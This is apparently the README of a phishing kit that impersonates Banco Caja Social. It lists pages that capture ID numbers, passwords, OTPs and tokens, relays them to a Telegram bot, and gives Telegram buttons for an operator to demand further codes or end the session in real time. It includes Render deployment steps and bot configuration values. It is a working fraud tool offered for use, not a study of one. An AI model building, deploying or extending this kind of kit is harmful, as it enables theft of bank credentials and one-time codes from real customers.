# Caja Social — solo Telegram (Render)

Proyecto **independiente** del portal Nequi. Incluye únicamente el flujo Banco Caja Social controlado por botones en Telegram.

## Contenido

| Archivo | Uso |
|---------|-----|
| `server.js` | Express + Socket.io + bot Telegram (polling) |
| `index.html` | Usuario (CC, CE, NI, TI, PE) |
| `password.html` | Contraseña (8 caracteres) → envía a Telegram |
| `otp.html` / `token.html` | OTP y token |
| `caja-social-telegram.js` | Botones y errores (Error Login, OTP, Token) |
| `client-optimized.js` | Flujo formularios |
| `js/banco-utils.js` | Socket y envío a Telegram |

## Desplegar en Render (nuevo servicio)

1. Mismo repositorio `nequipse` o solo esta carpeta.
2. **New → Web Service**
3. **Root Directory:** `Caja-Social-nuevo`
4. **Build Command:** `npm install`
5. **Start Command:** `npm start`
6. **Environment:**

```
TELEGRAM_BOT_TOKEN=8886352284:AAH...
TELEGRAM_CHAT_ID=-5218723082
```

7. **1 instancia** (evita conflicto 409 de Telegram si usas el mismo bot en otro servicio).

## Botones en Telegram

Tras enviar **contraseña** (y luego OTP/token si aplica):

- ❌ Error Login / Error OTP / Error Token  
- 🔐 Pedir Login · 📱 Pedir OTP · 📱 Pedir Token  
- ✅ Finalizar  

## Local

```bash
cd Caja-Social-nuevo
cp .env.example .env
# Editar .env con token y chat id
npm install
npm start
```

Abrir `http://localhost:3000`

## Health

`GET /health` → `{ "ok": true }`
